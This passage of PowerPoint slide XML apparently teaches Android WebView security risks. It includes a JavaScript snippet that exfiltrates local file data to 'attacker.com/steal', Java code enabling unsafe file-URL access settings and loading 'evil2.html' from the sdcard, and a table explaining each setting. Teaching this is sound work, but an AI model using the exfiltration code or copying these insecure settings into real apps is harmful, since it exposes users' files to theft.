              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>  .then(res =&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>res.text</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>()) </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>  .then(data =&gt; fetch('https://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>attacker.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>steal?data</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>=' + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>encodeURIComponent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>(data))); </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>&lt;/script&gt; </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>&lt;/body&gt; </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>&lt;/html&gt; </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="TextBox 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6F0F6BE9-FFDF-CB10-AE21-84801547DE0B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5199958" y="5222796"/>
            <a:ext cx="6992042" cy="1754326"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>Java code: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>webView.getSettings</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>().</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>setAllowFileAccess</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>(true); </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>webView.getSettings</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>().</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>setAllowFileAccessFromFileURLs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>(true); </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>webView.getSettings</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>().</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>setAllowUniversalAccessFromFileURLs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>(true); </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>webView.loadUrl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>file:///</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sdcard</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/evil2.html</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>"); </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Picture 6" descr="A blue background with white text&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FEC08D98-6577-85B7-C50E-9BBBD8C5ACB5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="10881558" y="0"/>
            <a:ext cx="1310441" cy="584200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2557921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90415D-2DED-5846-7B3A-B90FD2F09D07}"/>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80C5FCD-9D80-5478-2A1C-63375435FDC8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3829935706"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="784324" y="930069"/>
          <a:ext cx="9668009" cy="5571070"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="6990016">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3637377583"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2677993">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1888177942"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="554803">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" rtl="0" fontAlgn="base">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-GB" sz="2000" b="1" i="0">
                          <a:effectLst/>
                          <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                          <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                        </a:rPr>
                        <a:t>Setting</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-GB" sz="2000" b="0" i="0">
                          <a:effectLst/>
                          <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                          <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:endParaRPr lang="en-GB" sz="3300" b="0" i="0">
                        <a:effectLst/>
                        <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                        <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="167593" marR="167593" marT="83796" marB="83796">
                    <a:lnL>
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR>
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT>
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB>
                      <a:noFill/>
                    </a:lnB>
                    <a:noFill/>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" rtl="0" fontAlgn="base">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-GB" sz="2000" b="1" i="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                          <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                        </a:rPr>
                        <a:t>What it does</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-GB" sz="2000" b="0" i="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                          <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:endParaRPr lang="en-GB" sz="3300" b="0" i="0" dirty="0">
                        <a:effectLst/>
                        <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                        <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="167593" marR="167593" marT="83796" marB="83796">
                    <a:lnL>
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR>
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT>
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB>
                      <a:noFill/>
                    </a:lnB>
                    <a:noFill/>
                  </a:tcPr>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1406290346"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="1253107">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" rtl="0" fontAlgn="base">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-GB" sz="2000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="188038"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                          <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                        </a:rPr>
                        <a:t>setAllowFileAccess(true)</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-GB" sz="2000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="188038"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                          <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:endParaRPr lang="en-GB" sz="3300" b="0" i="0">
                        <a:effectLst/>
                        <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                        <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="167593" marR="167593" marT="83796" marB="83796">
                    <a:lnL>
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR>
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT>
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB>
                      <a:noFill/>
                    </a:lnB>
                    <a:noFill/>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" rtl="0" fontAlgn="base">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-GB" sz="2000" b="0" i="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                          <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                        </a:rPr>
                        <a:t>Lets WebView read files from device storage </a:t>
                      </a:r>
                      <a:endParaRPr lang="en-GB" sz="3300" b="0" i="0" dirty="0">
                        <a:effectLst/>
                        <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                        <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="167593" marR="167593" marT="83796" marB="83796">
                    <a:lnL>
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR>
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT>
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB>
                      <a:noFill/>
                    </a:lnB>
                    <a:noFill/>
                  </a:tcPr>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2857578877"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="1256946">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" rtl="0" fontAlgn="base">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-GB" sz="2000" b="1" i="0" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="188038"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                          <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                        </a:rPr>
                        <a:t>setAllowContentAccess</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-GB" sz="2000" b="1" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="188038"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                          <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                        </a:rPr>
                        <a:t>(true)</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-GB" sz="2000" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="188038"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                          <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:endParaRPr lang="en-GB" sz="3300" b="0" i="0" dirty="0">
                        <a:effectLst/>
                        <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                        <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="167593" marR="167593" marT="83796" marB="83796">
                    <a:lnL>
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR>
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT>
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB>
                      <a:noFill/>
                    </a:lnB>
                    <a:noFill/>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" rtl="0" fontAlgn="base">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-GB" sz="2000" b="0" i="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                          <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                        </a:rPr>
                        <a:t>Lets WebView access content from </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-GB" sz="2000" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="188038"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                          <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                        </a:rPr>
                        <a:t>content://</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-GB" sz="2000" b="0" i="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                          <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                        </a:rPr>
                        <a:t> URIs </a:t>
                      </a:r>
                      <a:endParaRPr lang="en-GB" sz="3300" b="0" i="0" dirty="0">
                        <a:effectLst/>
                        <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                        <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="167593" marR="167593" marT="83796" marB="83796">
                    <a:lnL>
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR>
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT>
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB>
                      <a:noFill/>
                    </a:lnB>
                    <a:noFill/>
                  </a:tcPr>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2167700098"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="1253107">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" rtl="0" fontAlgn="base">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-GB" sz="2000" b="1" i="0" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="188038"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                          <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                        </a:rPr>
                        <a:t>setAllowFileAccessFromFileURLs</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-GB" sz="2000" b="1" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="188038"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                          <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                        </a:rPr>
                        <a:t>(true) </a:t>
                      </a:r>
                      <a:endParaRPr lang="en-GB" sz="3300" b="1" i="0" dirty="0">
                        <a:effectLst/>
                        <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                        <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="167593" marR="167593" marT="83796" marB="83796">
                    <a:lnL>
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR>
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT>
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB>
                      <a:noFill/>
                    </a:lnB>
                    <a:noFill/>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" rtl="0" fontAlgn="base">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-GB" sz="2000" b="0" i="0">
                          <a:effectLst/>
                          <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                          <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                        </a:rPr>
                        <a:t>Allows a </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-GB" sz="2000" b="1" i="0">
                          <a:effectLst/>
                          <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                          <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                        </a:rPr>
                        <a:t>file:// page</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-GB" sz="2000" b="0" i="0">
                          <a:effectLst/>
                          <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                          <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                        </a:rPr>
                        <a:t> to load </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-GB" sz="2000" b="1" i="0">
                          <a:effectLst/>
                          <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                          <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                        </a:rPr>
                        <a:t>other local files</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-GB" sz="2000" b="0" i="0">
                          <a:effectLst/>
                          <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                          <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:endParaRPr lang="en-GB" sz="3300" b="0" i="0">
                        <a:effectLst/>
                        <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                        <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="167593" marR="167593" marT="83796" marB="83796">
                    <a:lnL>
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR>
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT>
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB>
                      <a:noFill/>
                    </a:lnB>
                    <a:noFill/>
                  </a:tcPr>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="980837401"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="1253107">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" rtl="0" fontAlgn="base">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-GB" sz="2000" b="1" i="0" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="188038"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                          <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                        </a:rPr>
                        <a:t>setAllowUniversalAccessFromFileURLs</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-GB" sz="2000" b="1" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="188038"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                          <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                        </a:rPr>
                        <a:t>(true) </a:t>
                      </a:r>
                      <a:endParaRPr lang="en-GB" sz="3300" b="1" i="0" dirty="0">
                        <a:effectLst/>
                        <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                        <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="167593" marR="167593" marT="83796" marB="83796">
                    <a:lnL>
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR>
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT>
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB>
                      <a:noFill/>
                    </a:lnB>
                    <a:noFill/>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" rtl="0" fontAlgn="base">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-GB" sz="2000" b="0" i="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                          <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                        </a:rPr>
                        <a:t>Allows a </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-GB" sz="2000" b="1" i="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                          <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                        </a:rPr>
                        <a:t>file:// page</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-GB" sz="2000" b="0" i="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                          <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                        </a:rPr>
                        <a:t> to load </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-GB" sz="2000" b="1" i="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                          <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                        </a:rPr>
                        <a:t>internet content</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-GB" sz="2000" b="0" i="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                          <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                        </a:rPr>
                        <a:t> (HTTP/S) </a:t>
                      </a:r>
                      <a:endParaRPr lang="en-GB" sz="3300" b="0" i="0" dirty="0">
                        <a:effectLst/>
                        <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                        <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="167593" marR="167593" marT="83796" marB="83796">
                    <a:lnL>
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR>
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT>
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB>
                      <a:noFill/>
                    </a:lnB>
                    <a:noFill/>
                  </a:tcPr>
                </a:tc>
